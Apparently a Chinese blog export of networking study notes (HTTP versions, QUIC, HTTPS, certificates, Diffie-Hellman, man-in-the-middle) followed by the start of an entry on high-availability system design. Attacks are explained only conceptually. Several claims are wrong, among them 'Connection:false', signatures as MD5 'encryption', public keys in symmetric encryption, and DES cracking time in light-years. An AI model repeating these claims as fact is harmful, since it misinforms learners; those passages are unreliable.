<h2 id="HTTP和TCP的区别"><a href="#HTTP和TCP的区别" class="headerlink" title="HTTP和TCP的区别"></a>HTTP和TCP的区别</h2><p>http协议是超文本传输协议，是应用层协议，http协议是建立在tcp协议之上的。http协议的特点是客户端发送请求都需要服务端回应，在请求结束后，会主动释放链接。从建立连接到关闭连接的过程称为‘一次连接’。</p>
<h2 id="HTTP-1-0-1-1-2-0-3-0-的特点及其区别"><a href="#HTTP-1-0-1-1-2-0-3-0-的特点及其区别" class="headerlink" title="HTTP 1.0 1.1 2.0 3.0 的特点及其区别"></a>HTTP 1.0 1.1 2.0 3.0 的特点及其区别</h2><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP 1.0"></a>HTTP 1.0</h3><p>HTTP1.0最早在网页中使用是在1996年，那个时候只是使用一些较为简单的网页上和网络请求上</p>
<p>1.0的HTTP版本，是一种无状态，无连接的应用层协议。 HTTP1.0规定浏览器和服务器保持短暂的链接。</p>
<p>浏览器每次请求都需要与服务器建立一个TCP连接，服务器处理完成以后立即断开TCP连接(无连接)，服务器不跟踪也每个客户单，也不记录过去的请求(无状态)。</p>
<p>这种无状态性可以借助cookie&#x2F;session机制来做身份认证和状态记录。</p>
<h4 id="HTTP1-0存在的问题"><a href="#HTTP1-0存在的问题" class="headerlink" title="HTTP1.0存在的问题"></a>HTTP1.0存在的问题</h4><h5 id="无法复用连接"><a href="#无法复用连接" class="headerlink" title="无法复用连接"></a>无法复用连接</h5><p>每次发送请求，都需要进行一次TCP连接，而TCP的连接释放过程又是比较费事的。这种无连接的特性会使得网络的利用率变低。</p>
<h5 id="队头阻塞-head-of-line-blocking"><a href="#队头阻塞-head-of-line-blocking" class="headerlink" title="队头阻塞(head of line blocking)"></a>队头阻塞(head of line blocking)</h5><p>由于HTTP1.0规定下一个请求必须在前一个请求响应到达之前才能发送，假设前一个请求响应一直不到达，那么下一个请求就不发送，后面的请求就阻塞了。</p>
<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP 1.1"></a>HTTP 1.1</h3><p>HTTP1.1在1999年才开始广泛应用于现在的各大浏览器网络请求中，同时HTTP1.1也是当前使用最为广泛的HTTP协议。</p>
<p>HTTP1.1继承了HTTP1.0的简单，克服了HTTP1.0性能上的问题。</p>
<p><strong>长连接</strong></p>
<p>HTTP1.1增加Connection字段，通过设置Keep-Alive保持HTTP连接不断卡。避免每次客户端与服务器请求都要重复建立释放建立TCP连接。提高了网络的利用率。</p>
<p>如果客户端想关闭HTTP连接，可以在请求头中携带Connection:false来告知服务器关闭请求。</p>
<p><strong>管道化(pipelining)— 尴尬的假并行传输</strong></p>
<p>HTTP1.1支持请求管道化(pipelining)。</p>
<p>基于HTTP1.1的长连接，使得请求管线化成为可能。 管线化使得请求能够“并行”传输。</p>
<p>例如：</p>
<p>假如响应的主体是一个html页面，页面中包含了很多img，这个时候keep-alive就了很大作用。能够“并行”发送多个请求。(注意，这里的“并行”并不是真正意义上的并行传输)</p>
<p>需要注意的是：服务器必须按照客户端请求的先后顺序依次回送相应的结果，以保证客户端能够区分出每次请求的响应内容。</p>
<p>也就是说，HTTP管道化可以让我们把先进先出队列从客户端(请求队列)迁移到服务端(响应队列)</p>
<p><strong>如果，客户端同时发了两个请求分别获取html和css，假如说服务器的css资源先准备就绪，服务器也会先发送html，再发送css。 换句话来说，只有等到html响应的资源完全传输完毕后，css响应的资源才开始传输，不允许同时存在两个并行的响应。</strong></p>
<p>可见，HTTP1.1还是无法解决队头阻塞(head of line blocking)的问题。同时“管道化”技术存在各种各样的问题，所以很多浏览器要么根本不支持它，要么直接默认关闭，并且开启的条件很苛刻……而且好像实际也没有什么用处。</p>
<p><strong>真并行传输 — 浏览器优化策略</strong></p>
<p>HTTP1.1支持管道化，但是服务器也必须进行逐个响应的送回，这个是很大的一个缺陷。实际上，现阶段的浏览器厂商采取了另外一种做法，它允许我们打开多个TCP的会话，也就是说，上图我们看到的并行，其实是不同的TCP连接上的HTTP请求和相应。这才是真正的并行!</p>
<p><strong>缓存处理 — 强缓存、协商缓存，启发式缓存(新增)</strong></p>
<p>此外，HTTP1.1还加入了缓存处理(强缓存和协商缓存)，新的字段如cache-control，支持断点传输，以及增加了Host字段(使得一个服务器能够用来创建多个Web站点)</p>
<h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP 2.0"></a>HTTP 2.0</h3><p><strong>二进制分帧</strong></p>
<p>HTTP2.0通过在应用层和传输层之间增加一个二进制分层帧，突破了HTTP1.1的性能限制，改进传输性能。</p>
<p><strong>多路复用(链接共享)— 真并行传输</strong></p>
<ul>
<li>流(stream)：已建立连接上的双向字节流。</li>
<li>消息：与逻辑消息对应的完整的一系列数据帧。</li>
<li>帧(frame)：HTTP2.0通信的最小单位，每个帧包含头部，至少也会标识出当前所属的流(stream_id)</li>
</ul>
<p>所有HTTP2.0通信都在一个TCP链接上完成，这个链接可以承载任意流量的双向数据流。</p>
<p>每个数据流以消息的形式发送，而消息由一或多个帧组成。这些帧可以乱序发送，然后再根据每个帧头部的流标识符(Stream_id)重新封装。</p>
<p>多路复用(连接共享)可能会导致关键字被阻塞，HTTP2.0里每个数据流都可以设置优先级和依赖，优先级高的数据流会被服务器优先处理和返回客户端，数据流还可以依赖其他的子数据流。</p>
<p>可见，HTTP2.0实现了真正的并行传输，它能够在一个TCP上进行任意数量的HTTP请求。而这个强大的功能基于“二级制分帧”的特性。</p>
<p><strong>头部压缩</strong></p>
<p>在HTTP1.X中，头部元数据都是以纯文本的形式发送的，通常会给每个请求增加500-8000字节的负荷。</p>
<p>比如cookie，默认情况下，浏览器会在每次请求的时候，把cookie附在header上面发给服务器。</p>
<p>HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header_files表，既避免重复header的传输，又减少了需要传输的大小。</p>
<p>高效的压缩算法可以很大的压缩header，减少发送包的数量从而降低延迟。</p>
<p><strong>服务器推送</strong></p>
<p>服务器除了最初请求的响应外，服务器还可以额外向客户端推送资源，而无需客户端明确的需求。</p>
<p><strong>HTTP3.0</strong></p>
<p>Google搞了一个基于UDP协议的QUIC协议，并且使用在了HTTP&#x2F;3上， HTTP&#x2F;3之前的名称为HTTP-over-QUIC。</p>
<p>早期Quic协议，存在IETF和Google两个版本，直到它被证实命名为HTTP3.0</p>
<p><strong>IETF的QUIC工作小组创造了QUIC传输协议。QUIC是一个使用UDP来替代TCP的协议。最初的时候，Google开始助力QUIC，其后QUIC更多地被叫做“HTTP&#x2F;2-encrypted-over-UDP “。</strong></p>
<p><strong>社区中的人们已经使用非正式名称如iQUIC和gQUIC来指代这些不同版本的协议，以将QUIC协议与IETF和Google分开(因为它们在细节上差异很大)。通过“iQUIC”发送HTTP的协议被称为“HQ”(HTTP-over-QUIC)很长一段时间。</strong></p>
<p><strong>2018年11月7日，Litespeed的Dmitri宣布他们和Facebook已经成功地完成了两个HTTP&#x2F;3实现之间的第一次互操作。Mike Bihop在该主题的HTTPBIS会话中的后续介绍可以在这里看到。会议结束时达成共识称新名称是HTTP&#x2F;3!</strong></p>
<p><strong>0-RTT — QUIC协议相比HTTP2.0的最大优势</strong></p>
<p>缓存当前会话的上下文，下次恢复会话的时候，只需要将之前的缓存传递给服务器，验证通过，就可以进行传输了。</p>
<p>0-RTT建连可以说是QUIC相比HTTP2最大的性能优势。</p>
<p>什么是0-RTT建连?</p>
<ul>
<li>传输层0-RTT就能建立连接</li>
<li>加密层0-RTT就能建立加密连接</li>
</ul>
<p><strong>多路复用</strong></p>
<p>QUIC基于UDP，一个连接上的多个stream之间没有依赖，即使丢包，只需要重发丢失的包即可，不需要重传整个连接。</p>
<p><strong>更好的移动端表现</strong></p>
<p>QUIC在移动端的表现比TCP好，因为TCP是基于IP识别连接，而QUIC是通过ID识别链接。 无论网络环境如何变化，只要ID不便，就能迅速重新连上。</p>
<p><strong>加密认证的根文 — 武装到牙齿</strong></p>
<p>TCP协议头没有经过任何加密和认证，在传输过程中很容易被中间网络设备篡改、注入和窃听。</p>
<p>QUIC的packet可以说武装到了牙齿，除了个别报文，比如PUBLIC_RESET和CHLO，所有报文头部都是经过认证的，报文Body都是经过加密的。</p>
<p>所以只要对 QUIC 做任何更改，接收端都能及时发现，有效地降低了安全风险。</p>
<p><strong>向前纠错机制</strong></p>
<p>QUIC协议有一个非常独特的特性，称为向前纠错(Foward Error Connec，FEC)，每个数据包除了它本身的内容之外还包括了其他数据包的数据，因此少量的丢包可以通过其他包的冗余数据直接组装而无需重传。</p>
<p>向前纠错牺牲了每个数据包可以发送数据的上限，但是带来的提升大于丢包导致的数据重传，因为数据重传将会消耗更多的时间(包括确认数据包丢失，请求重传，等待新数据包等步骤的时间消耗)。</p>
<p>例如：</p>
<ul>
<li>我总共发送三个包，协议会算出这个三个包的异或值并单独发出一个校验包，也就是总共发出了四个包。</li>
<li>当其中出现了非校验包丢失的情况，可以通过另外三个包计算出丢失的数据包的内容。</li>
<li>当然这种技术只能使用在丢失一个包的情况下，如果出现丢失多个包，就不能使用纠错机制了，只能使用重传的方式了。</li>
</ul>
<p>HTTP2.0使用了多路复用的技术，做到同一个连接并发处理多个请求，而且并发请求的数量比HTTP1.1大了好几个数量级。HTTP1.1也可以多建立几个TCP连接，来支持处理更多并发的请求，但是创建TCP连接本身也是有开销的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848907.jpeg" alt="img"></p>
<p>​    HTTP1.1不支持header数据的压缩，HTTP2.0使用HPACK算法对header的数据进行压缩，这样数据体积小了，在网络上传输就会更快。</p>
<p> 为了改善延迟，HTTP2.0引入了server push，它允许服务端推送资源给浏览器，在浏览器明确地请求之前，免得客户端再次创建连接发送请求到服务器端获取。这样客户端可以直接从本地加载这些资源，不用再通过网络。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848920.jpeg" alt="img"></p>
<ol>
<li><strong>长连接</strong> : <strong>在HTTP&#x2F;1.0中，默认使用的是短连接</strong>，也就是说每次请求都要重新建立一次连接。HTTP 是基于TCP&#x2F;IP协议的，每一次建立或者断开连接都需要三次握手四次挥手的开销，如果每次请求都要这样的话，开销会比较大。因此最好能维持一个长连接，可以用个长连接来发多个请求。<strong>HTTP 1.1起，默认使用长连接</strong> ，默认开启Connection： keep-alive。 <strong>HTTP&#x2F;1.1的持续连接有非流水线方式和流水线方式</strong> 。流水线方式是客户在收到HTTP的响应报文之前就能接着发送新的请求报文。与之相对应的非流水线方式是客户在收到前一个响应后才能发送下一个请求。</li>
<li><strong>错误状态响应码</strong> :在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</li>
<li><strong>缓存处理</strong> :在HTTP1.0中主要使用header里的If-Modified-Since，Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since， If-Match， If-None-Match等更多可供选择的缓存头来控制缓存策略。</li>
<li><strong>带宽优化及网络连接的使用</strong> :HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</li>
</ol>
<p><strong>问题归纳</strong></p>
<p><strong>HTTP1.1的合并请求(如CSSsprites)是否适用于HTTP2.0</strong></p>
<p>没有必要。</p>
<p>在头部压缩技术中，客户端和服务器均会维护两份相同的静态字典和动态字典。</p>
<p>在静态字典中，包含了常见的头部名称与值的组合。静态字典在首次请求时可以使用。那么现在头部的字段就可以被简写成静态字典中相应字段的index。</p>
<p>而动态字典跟连接的上下文相关，每个HTTP&#x2F;2连接维护的动态字典不尽相同。动态字典可以在连接不停地进行更新。</p>
<p>也就是说，原本完整的HTTP报文头部的键值或字段，由于字典的存在，现在可以转换成索引index，在相应的端再进行查找还原，也就起到了压缩的作用。</p>
<p>所以，<strong>同一个链接上产生的请求和响应越多，动态字典累积得越全，头部压缩的效果也就越好，所以针对HTTP&#x2F;2网站，最佳实践是不要合并资源。</strong></p>
<p>另外，HTTP2.0多路复用，使得请求可以并行传输，而HTTP1.1合并请求的一个原因也是为了防止过多的HTTP请求带来的阻塞问题。而现在HTTP2.0已经能够并行传输了，所以合并请求也就没有必要了。</p>
<p><strong>为什么要有HTTP3.0：HTTP&#x2F;2底层TCP的局限带来的问题</strong></p>
<p>由于HTTP&#x2F;2使用了多路复用，一般来说，同一个域名下只需要使用一个TCP链接，但当这个连接中出现了丢包的情况，就会导致HTTP&#x2F;2的表现情况反倒不如HTTP&#x2F;2了。</p>
<p>原因是： 在出现丢包的额情况下，整个TCP都要开始等待重传，导致后面的所有数据都被阻塞。</p>
<p>但是对于HTTP&#x2F;1.1来说，可以开启多个TCP连接，出现这种情况只会影响其中一个连接，剩余的TCP链接还可以正常传输数据。</p>
<p>由于修改TCP协议是不可能完成的任务。</p>
<p><strong>如何在Chrome中启用 QUIC 协议</strong></p>
<p>MTF在资源服务器和内容分发节点都已经启用了 HTTP3.0 协议，根据 用户浏览器 向下兼容，强烈建议您在Chrome浏览器开启实验性QUICK协议支持，体验加速效果：</p>
<p>在浏览器地址栏：输入chrome:&#x2F;&#x2F;flags</p>
<p>找到Experimental QUIC protocol，将Default改为Enabled</p>
<h2 id="URI和URL的区别是什么"><a href="#URI和URL的区别是什么" class="headerlink" title="URI和URL的区别是什么?"></a>URI和URL的区别是什么?</h2><ul>
<li>URI(Uniform Resource Identifier) 是统一资源标志符，可以唯一标识一个资源。</li>
<li>URL(Uniform Resource Location) 是统一资源定位符，可以提供该资源的路径。它是一种具体的 URI，即 URL 可以用来标识一个资源，而且还指明了如何 locate 这个资源。</li>
</ul>
<p>URI的作用像身份证号一样，URL的作用更像家庭住址一样。URL是一种具体的URI，它不仅唯一标识资源，而且还提供了定位该资源的信息。</p>
<h2 id="HTTP-和-HTTPS-的区别？"><a href="#HTTP-和-HTTPS-的区别？" class="headerlink" title="HTTP 和 HTTPS 的区别？"></a>HTTP 和 HTTPS 的区别？</h2><ol>
<li><p><strong>端口</strong> ：HTTP的URL由“http:&#x2F;&#x2F;”起始且默认使用端口80，而HTTPS的URL由“https:&#x2F;&#x2F;”起始且默认使用端口443。</p>
</li>
<li><p>安全性和资源消耗：</p>
<p>HTTP协议运行在TCP之上，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份。HTTPS是运行在SSL&#x2F;TLS之上的HTTP协议，SSL&#x2F;TLS 运行在TCP之上。所有传输的内容都经过加密，加密采用对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密。所以说，HTTP 安全性没有 HTTPS高，但是 HTTPS 比HTTP耗费更多服务器资源。</p>
</li>
</ol>
<h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><h2 id="证书签发流程"><a href="#证书签发流程" class="headerlink" title="证书签发流程"></a>证书签发流程</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848929.jpg" alt="preview"></p>
<p>CA把证书给浏览器开发商，证书中包括CA的公钥和一些其它信息，用户下载浏览器里面就有很多CA证书。各大网站将自己的证书交个CA，CA核查其身份合法后用自己的私钥给网站证书签名。用户使用浏览器链接到网站。在加密链接建立之前，网站首先将自己的经过CA签名的证书发送给浏览器，浏览器首先根据该证书的信息，如那个CA对它进行了签名，结合浏览器自带的CA的证书，对该签名证书进行验证，如果验证通过，那么可以确定这个网站是真的网站。验证通过后，浏览器开始和网站建立安全通信。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211904472.jpg" alt="img"></p>
<h3 id="HTTPS的优点和缺点"><a href="#HTTPS的优点和缺点" class="headerlink" title="HTTPS的优点和缺点"></a>HTTPS的优点和缺点</h3><p>用HTTPS协议会使页面的加载时间延长近50%，增加10%到20%的耗电，此外，HTTPS协议还会影响缓存，增加数据开销和功耗，甚至已有安全措施也会受到影响也会因此而受到影响; 证书很贵;</p>
<p>而且HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。</p>
<p>最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。或者用户主动忽视浏览器提醒去访问， https也没有用;</p>
<p>https不一定安全</p>
<p>需要安装正版操作系统；安装正版浏览器，下载浏览器验证md5，hash，sum；安装杀毒软件；不要安装第三方证书；第三方机构不受信的话浏览器会打一个叉，但是用户可以执意去访问；</p>
<p>如果只用非对称加密，性能不好，用私钥加密的公钥能解开，服务器发的数据中间人能看到，而且加密耗时较长；</p>
<p>最简单的证书包含一个公开密钥、名称以及证书授权中心的数字签名</p>
<p>使用重定向方式让用户发送一个请求， 用户请求，<a href="http://www.baidu.com然后重定向到https//www.baidu.com%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%A6%82%E6%9E%9C%E5%9C%A8%E8%AE%BF%E9%97%AEwww.baidu.com%E8%BF%99%E6%AD%A5%E6%8B%A6%E6%88%AA%E4%BA%86%E7%9A%84%E8%AF%9D%E8%BF%98%E6%98%AF%E4%BC%9A%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C">www.baidu.com然后重定向到https://www.baidu.com，这个时候如果在访问www.baidu.com这步拦截了的话还是会有问题，</a> 可以重定向到另一个伪造的百度网站<a href="https://www.baldu.com,这个中间人可以申请到证书./">https://www.baldu.com，这个中间人可以申请到证书。</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848950.png" alt="image-20210601132322394"></p>
<p>如果return 307浏览器会做安全检查（302没有限制）就只能跳转到<a href="https://baidu.com,但是可以不让你return,直接拦截请求;/">https://baidu.com，但是可以不让你return，直接拦截请求；</a></p>
<p>浏览器可以再加几层来验证，例如电脑云管家验证， 中网可信网站验证， 知道创宇（安全联盟）验证；</p>
<p>人机交互：例如短信验证码，或者图形验证码，人脸识别，u盾</p>
<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><p>常见攻击方式:</p>
<ul>
<li>udp炸弹</li>
<li>dos攻击</li>
<li>ddos攻击 : 利用很多台电脑去给服务器发数据包，没有其他办法解决，利用扫描工具扫描出肉机，利用肉机给服务器发数据包，使得正常用户无法访问该服务器</li>
<li>恶意程序<ul>
<li>计算机病毒: 会传染其他程序的程序，传染是通过修改其他程序来把自身或者其变种复制进去</li>
<li>计算机蠕虫: 通过网络的通信功能将自身从一个结点发送到另外一个结点并启动运行的程序</li>
<li>特洛伊木马: 一种程序，它执行的功能超过所声称的功能</li>
<li>逻辑炸弹: 一种当运行环境满足某种特定条件时执行其他特殊功能的程序</li>
</ul>
</li>
</ul>
<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>DH算法并没有对双方身份进行验证。当Alice和Bob希望进行通信时，Eve可以很容易地向Alice冒充自己是Bob，以及向Bob冒充自己是Alice，然后分别和Alice和Bob建立公共的对称密钥。然后，Alice到Bob的通信都会通过Eve先使用自己与Alice建立的密钥先解密，获得明文信息之后，再用Eve与Bob建立的密钥加密，传给Bob。Bob到Alice的通信亦然。这样，Alice和Bob会以为自己和对方的通信是加密的，从而是安全的，但是它们的通信会经过Eve加解密一遍。Eve在Alice和Bob之间，拦截他们的通信，并且维持通信，就称为中间人攻击。</p>
<h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>效率高，密钥不适合在网上传输， 密钥维护麻烦</p>
<h3 id="DES-Data-Encyption-Standard"><a href="#DES-Data-Encyption-Standard" class="headerlink" title="DES(Data Encyption Standard)"></a>DES(Data Encyption Standard)</h3><p>它的保密性取决于密钥的保密， 算法是公开的. des是世界上第一个公认的实用密码算法标准，它曾对密码学的发展做出了重大贡献. 56位密钥破解需要3.5或21分钟， 128位密钥破解需要5.4*10 18次方光年.</p>
<h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>使用密钥对，公钥加密私钥解密，私钥加密公钥解密. </p>
<p>由于加密比较慢，可以先用对称加密加密文件，然后用公钥加密密钥，然后对方使用私钥解密密钥，然后用密码解密文件.</p>
<h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><ol>
<li><p>Alice和Bob通过交流，决定选择素数$p&#x3D;23$以及原根$g&#x3D;5$</p>
</li>
<li><p>Alice选择一个秘密整数$a&#x3D;4$，Bob选择一个秘密整数$b&#x3D;3$</p>
</li>
<li><p>Alice和Bob分别使用$p，g，a$和$b$计算出$A$和$B$</p>
<blockquote>
<p>$$<br>A&#x3D;g^amod(p)&#x3D;5^4mod(23)&#x3D;4<br>\<br>B&#x3D;g^bmod(p)&#x3D;5^3mod(23)&#x3D;10<br>$$</p>
</blockquote>
</li>
<li><p>Alice和Bob分别将这两个数字$A&#x3D;4$和$B&#x3D;10$通过网络发送给对方。</p>
</li>
<li><p>Alice和Bob收到$B$和$A$之后，分别计算：</p>
<blockquote>
<p>$$<br>s&#x3D;B^amod(p)&#x3D;10^4mod(23)&#x3D;18\<br>s&#x3D;A^bmod(p)&#x3D;4^3mod(23)&#x3D;18<br>$$</p>
</blockquote>
</li>
<li><p>现在Alice和Bob拥有了一个共同的密钥18。而且这个密钥从来没有在网络上传输过</p>
</li>
</ol>
<p>为什么Alice和Bob可以获得共同的公钥呢?</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>那现在看一下，DH算法可以运行的关键是什么？</p>
<p>即使攻击者Eve可以获得23、5、$A$和$B$，她仍然不能得到Alice和Bob的秘密数字4和3。也即，即使知道 $5^3mod(23)&#x3D;10$这个计算过程中的底数5，模数23和结果10，她依然不能得到指数3。这个就是DH算法所依赖的计算离散对数的难度。（证明计算离散对数很难超纲）</p>
<h4 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h4><p>如果a是素数<em>p</em>的一个原根，那么数值：</p>
<p><em>a</em>mod<em>p</em>，<em>a^2</em> mod<em>p</em>，…，<em>a^(p-1)</em> mod<em>p</em></p>
<p>是各不相同的整数，且以某种排列方式组成了从<em>1</em>到<em>p-1</em>的所有整数。</p>
<h3 id="什么是数字签名"><a href="#什么是数字签名" class="headerlink" title="什么是数字签名?"></a>什么是数字签名?</h3><p>为了避免数据在传输过程中被替换，比如黑客修改了你的报文内容，但是你并不知道，所以我们让发送端做一个数字签名，把数据的摘要消息进行一个加密，比如 MD5，得到一个签名，和数据一起发送。然后接收端把数据摘要进行 MD5 加密，如果和签名一样，则说明数据确实是真的。</p>
<h3 id="什么是数字证书？"><a href="#什么是数字证书？" class="headerlink" title="什么是数字证书？"></a>什么是数字证书？</h3><p>对称加密中，双方使用公钥进行解密。虽然数字签名可以保证数据不被替换，但是数据是由公钥加密的，如果公钥也被替换，则仍然可以伪造数据，因为用户不知道对方提供的公钥其实是假的。所以为了保证发送方的公钥是真的，CA 证书机构会负责颁发一个证书，里面的公钥保证是真的，用户请求服务器时，服务器将证书发给用户，这个证书是经由系统内置证书的备案的。</p>
<h3 id="获取数字证书"><a href="#获取数字证书" class="headerlink" title="获取数字证书"></a>获取数字证书</h3><p>将自己的公钥以及信息发给CA审核，CA审核后用自己的私钥对这些信息进行加密，得到签名，将公钥，个人信息以及签名放在一起形成数字证书发给申请者. </p>
<h4 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h4><ul>
<li>A公司向B公司发邮件(内容不保密，但是必须的确定是A公司发的)， 将邮件用单向散列函数算出128位摘要，然后用A的私钥对摘要加密得到数字签名，然后将邮件，数字签名以及数字证书发给公司B，公司B先用CA的公钥验证证书是否是CA所颁发(然后还得去ca上查改数字证书是否属于挂失状态)，通过后，然后用同样的单向散列函数算出128位摘要，然后用A的数字证书里面的A的公钥对数字签名进行解密，看结果是否相同，结果相同的话就可以保证这份邮件由A发出，且没有被修改过 </li>
<li>党中央向地方政府发一封邮件， 内容不保密，但是不能别篡改，也是使用这种数字签名的方式.</li>
<li>A用户和B网站通信</li>
<li>A公司向B公司发一份邮件，内容保密，并且还得确定是A公司发的 ，B公司将B的公钥发给A，A公司用这个公钥对邮件加密(内容保密). 对加密后的内容计算摘要，用A的私钥加密形成数字签名，发给B，B先用CA的公钥验证证书，然后用计算摘要，用A的公钥解密签名，比对是否相同，然后用自己的私钥解开邮件.</li>
</ul>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>高可用</title>
    <url>/2022/03/22/%E9%AB%98%E5%8F%AF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="高可用系统设计"><a href="#高可用系统设计" class="headerlink" title="高可用系统设计"></a>高可用系统设计</h1><h2 id="什么是高可用？可用性的判断标准是啥？"><a href="#什么是高可用？可用性的判断标准是啥？" class="headerlink" title="什么是高可用？可用性的判断标准是啥？"></a>什么是高可用？可用性的判断标准是啥？</h2><p>高可用描述的是一个系统在大部分时间都是可用的，可以提供服务的。高可用代表系统即使在发生硬件故障或者系统升级的时候，服务仍然是可用的。</p>
<p>一般情况下，使用多少个 9 来评判一个系统的可用性，比如 99.9999% 就是代表该系统在所有的运行时间中只有 0.0001% 的时间是不可用的，这样的系统就是非常非常高可用的了！当然，也会有系统如果可用性不太好的话，可能连 9 都上不了。</p>
<p>除此之外，系统的可用性还可以用某功能的失败次数与总的请求次数之比来衡量，比如对网站请求 1000 次，其中有 10 次请求失败，那么可用性就是 99%。</p>
<h2 id="哪些情况会导致系统不可用？"><a href="#哪些情况会导致系统不可用？" class="headerlink" title="哪些情况会导致系统不可用？"></a>哪些情况会导致系统不可用？</h2><ol>
<li>黑客攻击；</li>
<li>硬件故障，比如服务器坏掉；</li>
<li>并发量&#x2F;用户请求量激增导致整个服务宕掉或者部分服务不可用；</li>
<li>代码中的坏味道导致内存泄漏或者其他问题导致程序挂掉；</li>
<li>网站架构某个重要的角色比如 Nginx 或者数据库突然不可用；</li>
<li>自然灾害或者人为破坏；</li>
<li>……</li>
</ol>
<h2 id="有哪些提高系统可用性的方法？"><a href="#有哪些提高系统可用性的方法？" class="headerlink" title="有哪些提高系统可用性的方法？"></a>有哪些提高系统可用性的方法？</h2><h3 id="注重代码质量，测试严格把关"><a href="#注重代码质量，测试严格把关" class="headerlink" title="注重代码质量，测试严格把关"></a>注重代码质量，测试严格把关</h3><p>我觉得这个是最最最重要的，代码质量有问题比如比较常见的内存泄漏、循环依赖都是对系统可用性极大的损害。大家都喜欢谈限流、降级、熔断，但是我觉得从代码质量这个源头把关是首先要做好的一件很重要的事情。如何提高代码质量？比较实际可用的就是 CodeReview，不要在乎每天多花的那 1 个小时左右的时间，作用可大着呢！</p>
<p>另外，安利这个对提高代码质量有实际效果的宝贝：</p>
<ol>
<li>sonarqube ：保证你写出更安全更干净的代码！（ps: 目前所在的项目基本都会用到这个插件）。</li>
<li>Alibaba 开源的 Java 诊断工具 Arthas 也是很不错的选择。</li>
<li>IDEA 自带的代码分析等工具进行代码扫描也是非常非常棒的。</li>
</ol>
<h3 id="使用集群，减少单点故障"><a href="#使用集群，减少单点故障" class="headerlink" title="使用集群，减少单点故障"></a>使用集群，减少单点故障</h3><p>先拿常用的 Redis 举个例子！我们如何保证我们的 Redis 缓存高可用呢？答案就是使用集群，避免单点故障。当我们使用一个 Redis 实例作为缓存的时候，这个 Redis 实例挂了之后，整个缓存服务可能就挂了。使用了集群之后，即使一台 Redis 实例挂了，不到一秒就会有另外一台 Redis 实例顶上。</p>
<h3 id="限流"><a href="#限流" class="headerlink" title="限流"></a>限流</h3><p>流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。</p>
<h3 id="超时和重试机制设置"><a href="#超时和重试机制设置" class="headerlink" title="超时和重试机制设置"></a>超时和重试机制设置</h3><p>一旦用户请求超过某个时间的得不到响应，就抛出异常。这个是非常重要的，很多线上系统故障都是因为没有进行超时设置或者超时设置的方式不对导致的。在读取第三方服务的时候，尤其适合设置超时和重试机制。一般使用一些 RPC 框架的时候，这些框架都自带的超时重试的配置。如果不进行超时设置可能会导致请求响应速度慢，甚至导致请求堆积进而让系统无法再处理请求。重试的次数一般设为 3 次，再多次的重试没有好处，反而会加重服务器压力（部分场景使用失败重试机制会不太适合）。</p>
<h3 id="熔断机制"><a href="#熔断机制" class="headerlink" title="熔断机制"></a>熔断机制</h3><p>超时和重试机制设置之外，熔断机制也是很重要的。 熔断机制说的是系统自动收集所依赖服务的资源使用情况和性能指标，当所依赖的服务恶化或者调用失败次数达到某个阈值的时候就迅速失败，让当前系统立即切换依赖其他备用服务。 比较常用的流量控制和熔断降级框架是 Netflix 的 Hystrix 和 alibaba 的 Sentinel。</p>
<h3 id="异步调用"><a href="#异步调用" class="headerlink" title="异步调用"></a>异步调用</h3><p>异步调用的话我们不需要关心最后的结果，这样我们就可以用户请求完成之后就立即返回结果，具体处理我们可以后续再做，秒杀场景用这个还是蛮多的。但是，使用异步之后我们可能需要适当修改业务流程进行配合，比如用户在提交订单之后，不能立即返回用户订单提交成功，需要在消息队列的订单消费者进程真正处理完该订单之后，甚至出库后，再通过电子邮件或短信通知用户订单成功。除了可以在程序中实现异步之外，我们常常还使用消息队列，消息队列可以通过异步处理提高系统性能（削峰、减少响应所需时间）并且可以降低系统耦合性。</p>
